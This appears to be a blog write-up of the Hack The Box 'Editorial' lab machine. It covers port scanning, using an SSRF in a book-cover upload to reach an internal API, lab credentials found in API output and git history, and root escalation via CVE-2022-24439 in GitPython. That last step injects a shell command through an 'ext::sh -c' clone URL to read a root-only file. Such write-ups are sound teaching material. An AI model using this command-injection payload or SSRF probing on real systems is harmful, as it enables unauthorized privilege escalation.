---
layout: post
title: HTB - editorial
date: 2025-02-06 10:40 -0400
---

![img](/assets/img/editorial.png)

## nmap

```bash
~/workspace/projects/htb/editorial » cat nmap.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2024-12-05 12:13 -04
Stats: 0:00:32 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 12:13 (0:00:00 remaining)
Nmap scan report for 10.10.11.20
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 141.57 seconds
~/workspace/projects/htb/editorial » sudo nmap -p22,80 -sC -sV $(cat ip.txt) --min-rate 1024
[sudo] password for shafou:
Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-04 09:32 -04
Nmap scan report for editorial.htb (10.10.11.20)
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0dedb29ce253fbd4c8c1196e7580d864 (ECDSA)
|_  256 0fb9a7510e00d57b5b7c5fbf2bed53a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Editorial Tiempo Arriba
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.29 seconds
```

Some book site, the main feature is on `Publish with us`.
![img](/assets/img/editorial1.png)

It allows to upload some book info and also a book cover. Book cover has an ssrf.
Time to scan some internal ports.

Port 5000 has some documentation.

```json
{
    "messages": [{
        "promotions": {
            "description": "Retrieve a list of all the promotions in our library.",
            "endpoint": "/api/latest/metadata/messages/promos",
            "methods": "GET"
        }
    }, {
        "coupons": {
            "description": "Retrieve the list of coupons to use in our library.",
            "endpoint": "/api/latest/metadata/messages/coupons",
            "methods": "GET"
        }
    }, {
        "new_authors": {
            "description": "Retrieve the welcome message sended to our new authors.",
            "endpoint": "/api/latest/metadata/messages/authors",
            "methods": "GET"
        }
    }, {
        "platform_use": {
            "description": "Retrieve examples of how to use the platform.",
            "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
            "methods": "GET"
        }
    }],
    "version": [{
        "changelog": {
            "description": "Retrieve a list of all the versions and updates of the api.",
            "endpoint": "/api/latest/metadata/changelog",
            "methods": "GET"
        }
    }, {
        "latest": {
            "description": "Retrieve the last version of api.",
            "endpoint": "/api/latest/metadata",
            "methods": "GET"
        }
    }]
}
```

On `api/latest/metadata/messages/authors` there is some credentials.

```json
{
    "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
}
```

That gives us the user flag.

```bash
dev@editorial:~$ cat user.txt
c2375***************************
```

On `dev` home there is an apps dir with a git repo. Inspecting the commits gives us the prod user.

```diff
commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev

    * To use development environment.

diff --git a/app_api/app.py b/app_api/app.py
index 61b786f..3373b14 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,7 +64,7 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always her
```

# prod
prod is able to run a python script as root:

```bash
prod@editorial:~$ sudo -l
[sudo] password for prod:
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
prod@editorial:~$ cat /opt/internal_apps/clone_changes/clone_prod_change.py
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

Probably some cve? `GitPython==3.1.29` looks like its vulnerable to CVE-2022-24439.

```bash
prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >% /tmp/pwned'
prod@editorial:~$ cat /tmp/pwned
fb24d***************************
```
